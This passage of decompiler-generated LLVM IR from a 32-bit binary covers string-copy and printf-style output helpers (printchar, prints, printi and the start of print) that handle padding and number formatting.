  uselistorder label %dec_label_pc_80483ad, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80483c8 = load i32, i32* @ebp, align 4
  store i32 %v0_80483c8, i32* %stack_var_-4, align 4
  %v4_80483c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80483c8, i32* @ebp, align 4
  %v1_80483d1 = inttoptr i32 %arg2 to i8*
  %v2_80483d1 = call i32 @util_strlen(i8* %v1_80483d1)
  %v1_80483df = add i32 %v2_80483d1, 1
  %v3_80483e7 = inttoptr i32 %arg1 to i8*
  %v4_80483e7 = call i32 @util_memcpy(i8* %v3_80483e7, i32 %arg2, i32 %v1_80483df)
  %v2_80483f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80483f2, i32* @ebp, align 4
  ret i32 %v2_80483d1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80483fa = icmp eq i32* %arg1, null
  br i1 %v4_80483fa, label %dec_label_pc_8048419, label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048403 = load i32, i32* %arg1, align 4
  %v3_8048408 = inttoptr i32 %v2_8048403 to i8*
  store i8 %tmp8, i8* %v3_8048408, align 1
  %v2_804840d = load i32, i32* %arg1, align 4
  %v1_804840f = add i32 %v2_804840d, 1
  store i32 %v1_804840f, i32* %arg1, align 4
  br label %dec_label_pc_804842c

dec_label_pc_8048419:                             ; preds = %entry
  %v3_8048424 = bitcast i8* %stack_var_8 to i32*
  %v4_8048424 = call i32 @__GI_write(i32 1, i32* %v3_8048424, i32 1)
  br label %dec_label_pc_804842c

dec_label_pc_804842c:                             ; preds = %dec_label_pc_8048400, %dec_label_pc_8048419
  %v0_804842d = phi i32 [ %tmp3, %dec_label_pc_8048400 ], [ %v4_8048424, %dec_label_pc_8048419 ]
  ret i32 %v0_804842d

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804842c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_804848e, label %dec_label_pc_8048448

dec_label_pc_8048448:                             ; preds = %entry
  %v4_804844f = ptrtoint i8* %arg2 to i32
  %v2_804846056 = load i8, i8* %arg2, align 1
  %v3_804846057 = zext i8 %v2_804846056 to i32
  %v5_804846058 = and i32 %v4_804844f, -256
  %v6_804846059 = or i32 %v3_804846057, %v5_804846058
  %v4_804846260 = icmp eq i8 %v2_804846056, 0
  %v1_804846461 = icmp eq i1 %v4_804846260, false
  br i1 %v1_804846461, label %dec_label_pc_8048457, label %dec_label_pc_8048466

dec_label_pc_8048457:                             ; preds = %dec_label_pc_8048448, %dec_label_pc_8048457
  %v6_804846064 = phi i32 [ %v6_8048460, %dec_label_pc_8048457 ], [ %v6_804846059, %dec_label_pc_8048448 ]
  %v4_804845d63 = phi i32 [ %v5_804845a, %dec_label_pc_8048457 ], [ %v4_804844f, %dec_label_pc_8048448 ]
  %stack_var_-12.062 = phi i32 [ %v4_8048457, %dec_label_pc_8048457 ], [ 0, %dec_label_pc_8048448 ]
  %v4_8048457 = add i32 %stack_var_-12.062, 1
  %v5_804845a = add i32 %v4_804845d63, 1
  %v22_804845a = inttoptr i32 %v5_804845a to i8*
  %v2_8048460 = load i8, i8* %v22_804845a, align 1
  %v3_8048460 = zext i8 %v2_8048460 to i32
  %v5_8048460 = and i32 %v6_804846064, -256
  %v6_8048460 = or i32 %v3_8048460, %v5_8048460
  %v4_8048462 = icmp eq i8 %v2_8048460, 0
  %v1_8048464 = icmp eq i1 %v4_8048462, false
  br i1 %v1_8048464, label %dec_label_pc_8048457, label %dec_label_pc_8048466

dec_label_pc_8048466:                             ; preds = %dec_label_pc_8048457, %dec_label_pc_8048448
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048448 ], [ %v4_8048457, %dec_label_pc_8048457 ]
  %v5_804846c = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804846c, label %dec_label_pc_8048477, label %dec_label_pc_804847d

dec_label_pc_8048477:                             ; preds = %dec_label_pc_8048466
  %v5_804847a = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_8048466, %dec_label_pc_8048477
  %storemerge = phi i32 [ %v5_804847a, %dec_label_pc_8048477 ], [ 0, %dec_label_pc_8048466 ]
  %v1_8048480 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_8048480, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_804848e

dec_label_pc_804848e:                             ; preds = %dec_label_pc_804847d, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804847d ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_804847d ]
  %v1_8048491 = urem i32 %arg4, 2
  %v2_8048491 = icmp eq i32 %v1_8048491, 0
  %v1_8048496 = icmp eq i1 %v2_8048491, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048496, label %dec_label_pc_80484d8.preheader, label %dec_label_pc_80484b1.preheader

dec_label_pc_80484b1.preheader:                   ; preds = %dec_label_pc_804848e
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804849a.lr.ph, label %dec_label_pc_80484d8.preheader

dec_label_pc_804849a.lr.ph:                       ; preds = %dec_label_pc_80484b1.preheader
  br label %dec_label_pc_804849a

dec_label_pc_804849a:                             ; preds = %dec_label_pc_804849a.lr.ph, %dec_label_pc_804849a
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804849a.lr.ph ], [ %v4_80484ab, %dec_label_pc_804849a ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804849a.lr.ph ], [ %v4_80484ae, %dec_label_pc_804849a ]
  %v3_80484a3 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_80484ab = add i32 %stack_var_-20.052, 1
  %v4_80484ae = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_80484ae, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804849a, label %dec_label_pc_80484d8.preheader

dec_label_pc_80484d8.preheader:                   ; preds = %dec_label_pc_80484b1.preheader, %dec_label_pc_804849a, %dec_label_pc_804848e
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804848e ], [ %stack_var_12.0, %dec_label_pc_80484b1.preheader ], [ %v4_80484ae, %dec_label_pc_804849a ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804848e ], [ 0, %dec_label_pc_80484b1.preheader ], [ %v4_80484ab, %dec_label_pc_804849a ]
  %v2_80484db38 = load i8, i8* %arg2, align 1
  %v4_80484dd42 = icmp eq i8 %v2_80484db38, 0
  %v1_80484df43 = icmp eq i1 %v4_80484dd42, false
  br i1 %v1_80484df43, label %dec_label_pc_80484b9.lr.ph, label %dec_label_pc_80484fa.preheader

dec_label_pc_80484b9.lr.ph:                       ; preds = %dec_label_pc_80484d8.preheader
  %v4_80484d837 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_80484b9

dec_label_pc_80484b9:                             ; preds = %dec_label_pc_80484b9.lr.ph, %dec_label_pc_80484b9
  %v4_80484d846 = phi i32 [ %v4_80484d837, %dec_label_pc_80484b9.lr.ph ], [ %v5_80484d5, %dec_label_pc_80484b9 ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484b9.lr.ph ], [ %v4_80484d2, %dec_label_pc_80484b9 ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_80484b9.lr.ph ], [ %v22_80484d5, %dec_label_pc_80484b9 ]
  %v2_80484bc = load i8, i8* %stack_var_8.044, align 1
  %v3_80484bc = zext i8 %v2_80484bc to i32
  %v3_80484ca = call i32 @printchar(i32* %.pre11, i32 %v3_80484bc)
  %v4_80484d2 = add i32 %stack_var_-20.145, 1
  %v5_80484d5 = add i32 %v4_80484d846, 1
  %v22_80484d5 = inttoptr i32 %v5_80484d5 to i8*
  %v2_80484db = load i8, i8* %v22_80484d5, align 1
  %v4_80484dd = icmp eq i8 %v2_80484db, 0
  %v1_80484df = icmp eq i1 %v4_80484dd, false
  br i1 %v1_80484df, label %dec_label_pc_80484b9, label %dec_label_pc_80484fa.preheader

dec_label_pc_80484fa.preheader:                   ; preds = %dec_label_pc_80484b9, %dec_label_pc_80484d8.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484d8.preheader ], [ %v4_80484d2, %dec_label_pc_80484b9 ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_80484e3.lr.ph, label %dec_label_pc_8048500

dec_label_pc_80484e3.lr.ph:                       ; preds = %dec_label_pc_80484fa.preheader
  br label %dec_label_pc_80484e3

dec_label_pc_80484e3:                             ; preds = %dec_label_pc_80484e3.lr.ph, %dec_label_pc_80484e3
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484e3.lr.ph ], [ %v4_80484f4, %dec_label_pc_80484e3 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484e3.lr.ph ], [ %v4_80484f7, %dec_label_pc_80484e3 ]
  %v3_80484ec = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_80484f4 = add i32 %stack_var_-20.236, 1
  %v4_80484f7 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_80484f7, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_80484e3, label %dec_label_pc_8048500

dec_label_pc_8048500:                             ; preds = %dec_label_pc_80484e3, %dec_label_pc_80484fa.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484fa.preheader ], [ %v4_80484f4, %dec_label_pc_80484e3 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484d5, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %v5_804845a, { 1, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_80484e3, { 1, 0 }
  uselistorder label %dec_label_pc_80484b9, { 1, 0 }
  uselistorder label %dec_label_pc_80484d8.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804849a, { 1, 0 }
  uselistorder label %dec_label_pc_804847d, { 1, 0 }
  uselistorder label %dec_label_pc_8048457, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804851c = sext i32 %tmp35 to i64
  %v4_804851f = icmp eq i32 %tmp35, 0
  %v5_804851f = icmp slt i32 %tmp35, 0
  %v1_8048523 = icmp eq i1 %v4_804851f, false
  br i1 %v1_8048523, label %dec_label_pc_804854a, label %dec_label_pc_8048525

dec_label_pc_8048525:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_804853a = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048622

dec_label_pc_804854a:                             ; preds = %entry
  %v4_804854a = icmp eq i32 %tmp28, 0
  br i1 %v4_804854a, label %dec_label_pc_804856b, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v12_8048550 = icmp eq i32 %tmp27, 10
  %v1_8048554 = icmp eq i1 %v12_8048550, false
  br i1 %v1_8048554, label %dec_label_pc_804856b, label %dec_label_pc_8048556

dec_label_pc_8048556:                             ; preds = %dec_label_pc_8048550
  %v1_804855a = icmp eq i1 %v5_804851f, false
  br i1 %v1_804855a, label %dec_label_pc_804856b, label %dec_label_pc_804855c

dec_label_pc_804855c:                             ; preds = %dec_label_pc_8048556
  %v1_8048566 = sub i32 0, %tmp35
  %v5_8048568 = sext i32 %v1_8048566 to i64
  br label %dec_label_pc_804856b

dec_label_pc_804856b:                             ; preds = %dec_label_pc_8048556, %dec_label_pc_8048550, %dec_label_pc_804854a, %dec_label_pc_804855c
  %stack_var_-24.0 = phi i64 [ %v5_804851c, %dec_label_pc_804854a ], [ %v5_804851c, %dec_label_pc_8048550 ], [ %v5_804851c, %dec_label_pc_8048556 ], [ %v5_8048568, %dec_label_pc_804855c ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804854a ], [ 0, %dec_label_pc_8048550 ], [ 0, %dec_label_pc_8048556 ], [ 1, %dec_label_pc_804855c ]
  %v15_804856e = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_80485c97 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485c98 = icmp eq i32 %v4_80485c97, 0
  %v1_80485cd15 = icmp eq i1 %v5_80485c98, false
  br i1 %v1_80485cd15, label %dec_label_pc_804857c.lr.ph, label %dec_label_pc_80485cf

dec_label_pc_804857c.lr.ph:                       ; preds = %dec_label_pc_804856b
  %v5_804857f = sext i32 %tmp27 to i64
  %v1_804859b = add i32 %tmp, 198
  br label %dec_label_pc_804857c

dec_label_pc_804857c:                             ; preds = %dec_label_pc_804857c.lr.ph, %dec_label_pc_80485a1
  %v3_80485a118 = phi i8* [ %tmp48, %dec_label_pc_804857c.lr.ph ], [ %v22_80485a1, %dec_label_pc_80485a1 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804857c.lr.ph ], [ %v5_80485c6, %dec_label_pc_80485a1 ]
  %v6_804858a = and i64 %stack_var_-24.116, 4294967295
  %v12_804858a = udiv i64 %v6_804858a, %v5_804857f
  %v13_804858a = trunc i64 %v12_804858a to i32
  %v14_804858a = urem i64 %v6_804858a, %v5_804857f
  %v5_804858f = trunc i64 %v14_804858a to i8
  %v7_8048596 = icmp sgt i8 %v5_804858f, 9
  br i1 %v7_8048596, label %dec_label_pc_8048598, label %dec_label_pc_80485a1

dec_label_pc_8048598:                             ; preds = %dec_label_pc_804857c
  %tmp52 = trunc i64 %v14_804858a to i32
  %v6_804859e = add i32 %tmp52, %v1_804859b
  %v18_804859e = trunc i32 %v6_804859e to i8
  br label %dec_label_pc_80485a1

dec_label_pc_80485a1:                             ; preds = %dec_label_pc_804857c, %dec_label_pc_8048598
  %stack_var_-36.0 = phi i8 [ %v18_804859e, %dec_label_pc_8048598 ], [ %v5_804858f, %dec_label_pc_804857c ]
  %v4_80485a1 = ptrtoint i8* %v3_80485a118 to i32
  %v5_80485a1 = add i32 %v4_80485a1, -1
  %v22_80485a1 = inttoptr i32 %v5_80485a1 to i8*
  %v1_80485a7 = add i8 %stack_var_-36.0, 48
  store i8 %v1_80485a7, i8* %v22_80485a1, align 1
  %v5_80485c6 = sext i32 %v13_804858a to i64
  %v5_80485c9 = icmp eq i32 %v13_804858a, 0
  %v1_80485cd = icmp eq i1 %v5_80485c9, false
  br i1 %v1_80485cd, label %dec_label_pc_804857c, label %dec_label_pc_80485c9.dec_label_pc_80485cf_crit_edge

dec_label_pc_80485c9.dec_label_pc_80485cf_crit_edge: ; preds = %dec_label_pc_80485a1
  store i8* %v22_80485a1, i8** %stack_var_-40, align 4
  br label %dec_label_pc_80485cf

dec_label_pc_80485cf:                             ; preds = %dec_label_pc_80485c9.dec_label_pc_80485cf_crit_edge, %dec_label_pc_804856b
  %v3_804860c622 = phi i32 [ %v5_80485a1, %dec_label_pc_80485c9.dec_label_pc_80485cf_crit_edge ], [ %v15_804856e, %dec_label_pc_804856b ]
  %v3_80485fd = phi i8* [ %v22_80485a1, %dec_label_pc_80485c9.dec_label_pc_80485cf_crit_edge ], [ %tmp48, %dec_label_pc_804856b ]
  %v4_80485cf = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485cf, label %dec_label_pc_8048606, label %dec_label_pc_80485d5

dec_label_pc_80485d5:                             ; preds = %dec_label_pc_80485cf
  %v4_80485d5 = icmp eq i32 %tmp31, 0
  br i1 %v4_80485d5, label %dec_label_pc_80485fd, label %dec_label_pc_80485db

dec_label_pc_80485db:                             ; preds = %dec_label_pc_80485d5
  %v1_80485de = and i32 %tmp32, 2
  %v2_80485de = icmp eq i32 %v1_80485de, 0
  br i1 %v2_80485de, label %dec_label_pc_80485fd, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485db
  %v3_80485ed = inttoptr i32 %arg1 to i32*
  %v4_80485ed = call i32 @printchar(i32* %v3_80485ed, i32 45)
  %v4_80485f8 = add i32 %tmp31, -1
  br label %dec_label_pc_8048606

dec_label_pc_80485fd:                             ; preds = %dec_label_pc_80485db, %dec_label_pc_80485d5
  %v4_80485fd = ptrtoint i8* %v3_80485fd to i32
  %v5_80485fd = add i32 %v4_80485fd, -1
  %v22_80485fd = inttoptr i32 %v5_80485fd to i8*
  store i8* %v22_80485fd, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_80485fd, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_804860c6.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_8048606

dec_label_pc_8048606:                             ; preds = %dec_label_pc_80485cf, %dec_label_pc_80485e5, %dec_label_pc_80485fd
  %v3_804860c6 = phi i32 [ %v3_804860c622, %dec_label_pc_80485cf ], [ %v3_804860c6.pre, %dec_label_pc_80485fd ], [ %v3_804860c622, %dec_label_pc_80485e5 ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_80485cf ], [ %tmp31, %dec_label_pc_80485fd ], [ %v4_80485f8, %dec_label_pc_80485e5 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485cf ], [ 0, %dec_label_pc_80485fd ], [ 1, %dec_label_pc_80485e5 ]
  %v1_8048612.cast = inttoptr i32 %v3_804860c6 to i8*
  %v6_8048612 = call i32 @prints(i32 %arg1, i8* %v1_8048612.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_804861d = add i32 %v6_8048612, %stack_var_-28.0
  br label %dec_label_pc_8048622

dec_label_pc_8048622:                             ; preds = %dec_label_pc_8048525, %dec_label_pc_8048606
  %storemerge = phi i32 [ %v2_804861d, %dec_label_pc_8048606 ], [ %v6_804853a, %dec_label_pc_8048525 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_80485a1, { 0, 1, 3, 2 }
  uselistorder i8 %v5_804858f, { 1, 0 }
  uselistorder i64 %v6_804858a, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048622, { 1, 0 }
  uselistorder label %dec_label_pc_8048606, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485a1, { 1, 0 }
  uselistorder label %dec_label_pc_804857c, { 1, 0 }
  uselistorder label %dec_label_pc_804856b, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v15_804862a = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048819 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.442 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804884f43 = load i8, i8* %stack_var_8.442, align 1
  %v3_804884f44 = zext i8 %v2_804884f43 to i32
  %v5_804884f45 = and i32 %arg2, -256
  %v6_804884f46 = or i32 %v3_804884f44, %v5_804884f45
  store i32 %v6_804884f46, i32* %eax.global-to-local, align 4
  %v4_804885147 = icmp eq i8 %v2_804884f43, 0
  %v1_804885348 = icmp eq i1 %v4_804885147, false
  br i1 %v1_804885348, label %dec_label_pc_8048639, label %dec_label_pc_8048859

dec_label_pc_8048639:                             ; preds = %entry, %dec_label_pc_8048849
  %v0_8048837 = phi i32 [ %v4_80486fb64, %dec_label_pc_8048849 ], [ %v15_804862a, %entry ]
  %v5_804884f54 = phi i32 [ %v5_804884f, %dec_label_pc_8048849 ], [ %v5_804884f45, %entry ]
  %stack_var_8.453 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048849 ], [ %stack_var_8.442, %entry ]
  %stack_var_-28.152 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048849 ], [ 0, %entry ]
  %stack_var_8.4.in51 = phi i32 [ %v5_8048849, %dec_label_pc_8048849 ], [ %arg2, %entry ]
  %stack_var_12.150 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048849 ], [ %arg3, %entry ]
  %stack_var_-24.149 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048849 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in51, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.453, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804884f54
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %v10_804863e = icmp eq i8 %v2_804863c, 37
  %v1_8048640 = icmp eq i1 %v10_804863e, false
  br i1 %v1_8048640, label %dec_label_pc_804882d, label %dec_label_pc_8048646

dec_label_pc_8048646:                             ; preds = %dec_label_pc_8048639
  %v5_8048646 = add i32 %stack_var_8.4.in51, 1
  %v22_8048646 = inttoptr i32 %v5_8048646 to i8*
  store i32 %v5_8048646, i32* %eax.global-to-local, align 4
  %v2_8048659 = load i8, i8* %v22_8048646, align 1
  %v3_8048659 = zext i8 %v2_8048659 to i32
  %v5_8048659 = and i32 %v5_8048646, -256
  %v6_8048659 = or i32 %v3_8048659, %v5_8048659
  store i32 %v6_8048659, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i8 %v2_8048659, 0
  br i1 %v4_804865b, label %dec_label_pc_8048859, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048646
  store i32 %v5_8048646, i32* %eax.global-to-local, align 4
  %v2_8048666 = load i8, i8* %v22_8048646, align 1
  %v3_8048666 = zext i8 %v2_8048666 to i32
  %v6_8048666 = or i32 %v3_8048666, %v5_8048659
  store i32 %v6_8048666, i32* %eax.global-to-local, align 4
  %v10_8048668 = icmp eq i8 %v2_8048666, 37
  br i1 %v10_8048668, label %dec_label_pc_804882d, label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_8048663
  store i32 %v5_8048646, i32* %eax.global-to-local, align 4
  %v2_8048673 = load i8, i8* %v22_8048646, align 1
  %v3_8048673 = zext i8 %v2_8048673 to i32
  %v6_8048673 = or i32 %v3_8048673, %v5_8048659
  store i32 %v6_8048673, i32* %eax.global-to-local, align 4
  %v10_8048675 = icmp eq i8 %v2_8048673, 45
  %v1_8048677 = icmp eq i1 %v10_8048675, false
  br i1 %v1_8048677, label %dec_label_pc_804868c.preheader, label %dec_label_pc_8048679

dec_label_pc_8048679:                             ; preds = %dec_label_pc_8048670
  %v5_8048679 = add i32 %stack_var_8.4.in51, 2
  %v22_8048679 = inttoptr i32 %v5_8048679 to i8*
  br label %dec_label_pc_804868c.preheader

dec_label_pc_804868c.preheader:                   ; preds = %dec_label_pc_8048679, %dec_label_pc_8048670
  %stack_var_8.0.ph = phi i8* [ %v22_8048646, %dec_label_pc_8048670 ], [ %v22_8048679, %dec_label_pc_8048679 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_8048670 ], [ 1, %dec_label_pc_8048679 ]
  %v4_804868c15 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804868c15, i32* %eax.global-to-local, align 4
  %v2_804868f16 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804868f17 = zext i8 %v2_804868f16 to i32
  %v5_804868f18 = and i32 %v4_804868c15, -256
  %v6_804868f19 = or i32 %v3_804868f17, %v5_804868f18
  store i32 %v6_804868f19, i32* %eax.global-to-local, align 4
  %v7_804869120 = icmp eq i8 %v2_804868f16, 48
  br i1 %v7_804869120, label %dec_label_pc_8048685, label %dec_label_pc_80486b8.preheader

dec_label_pc_8048685:                             ; preds = %dec_label_pc_804868c.preheader, %dec_label_pc_8048685
  %v4_804868c22 = phi i32 [ %v5_8048685, %dec_label_pc_8048685 ], [ %v4_804868c15, %dec_label_pc_804868c.preheader ]
  %stack_var_-32.021 = phi i32 [ %v4_8048688, %dec_label_pc_8048685 ], [ %stack_var_-32.0.ph, %dec_label_pc_804868c.preheader ]
  %v5_8048685 = add i32 %v4_804868c22, 1
  %v22_8048685 = inttoptr i32 %v5_8048685 to i8*
  %v4_8048688 = or i32 %stack_var_-32.021, 2
  store i32 %v5_8048685, i32* %eax.global-to-local, align 4
  %v2_804868f = load i8, i8* %v22_8048685, align 1
  %v3_804868f = zext i8 %v2_804868f to i32
  %v5_804868f = and i32 %v5_8048685, -256
  %v6_804868f = or i32 %v3_804868f, %v5_804868f
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v7_8048691 = icmp eq i8 %v2_804868f, 48
  br i1 %v7_8048691, label %dec_label_pc_8048685, label %dec_label_pc_80486b8.preheader

dec_label_pc_80486b8.preheader:                   ; preds = %dec_label_pc_8048685, %dec_label_pc_804868c.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804868c.preheader ], [ %v4_8048688, %dec_label_pc_8048685 ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804868c.preheader ], [ %v22_8048685, %dec_label_pc_8048685 ]
  %v4_80486b824 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_80486b824, i32* %eax.global-to-local, align 4
  %v2_80486bb25 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_80486bb26 = zext i8 %v2_80486bb25 to i32
  %v5_80486bb27 = and i32 %v4_80486b824, -256
  %v6_80486bb28 = or i32 %v3_80486bb26, %v5_80486bb27
  store i32 %v6_80486bb28, i32* %eax.global-to-local, align 4
  %tmp65 = icmp ult i8 %v2_80486bb25, 48
  br i1 %tmp65, label %dec_label_pc_80486ca, label %dec_label_pc_80486c1

dec_label_pc_8048697:                             ; preds = %dec_label_pc_80486c1
  %v2_80486a0 = mul i32 %stack_var_-36.030, 10
  store i32 %v4_80486b832, i32* %eax.global-to-local, align 4
  %v2_80486a8 = load i8, i8* %stack_var_8.131, align 1
  %v3_80486a8 = zext i8 %v2_80486a8 to i32
  %v1_80486af = add nsw i32 %v3_80486a8, -48
  %v5_80486b2 = add i32 %v1_80486af, %v2_80486a0
  %v5_80486b5 = add i32 %v4_80486b832, 1
  %v22_80486b5 = inttoptr i32 %v5_80486b5 to i8*
  store i32 %v5_80486b5, i32* %eax.global-to-local, align 4
  %v2_80486bb = load i8, i8* %v22_80486b5, align 1
  %v3_80486bb = zext i8 %v2_80486bb to i32
  %v5_80486bb = and i32 %v5_80486b5, -256
  %v6_80486bb = or i32 %v3_80486bb, %v5_80486bb
  store i32 %v6_80486bb, i32* %eax.global-to-local, align 4
  %tmp66 = icmp ult i8 %v2_80486bb, 48
  br i1 %tmp66, label %dec_label_pc_80486ca, label %dec_label_pc_80486c1

dec_label_pc_80486c1:                             ; preds = %dec_label_pc_80486b8.preheader, %dec_label_pc_8048697
  %v5_80486bb33 = phi i32 [ %v5_80486bb, %dec_label_pc_8048697 ], [ %v5_80486bb27, %dec_label_pc_80486b8.preheader ]
  %v4_80486b832 = phi i32 [ %v5_80486b5, %dec_label_pc_8048697 ], [ %v4_80486b824, %dec_label_pc_80486b8.preheader ]
  %stack_var_8.131 = phi i8* [ %v22_80486b5, %dec_label_pc_8048697 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486b8.preheader ]
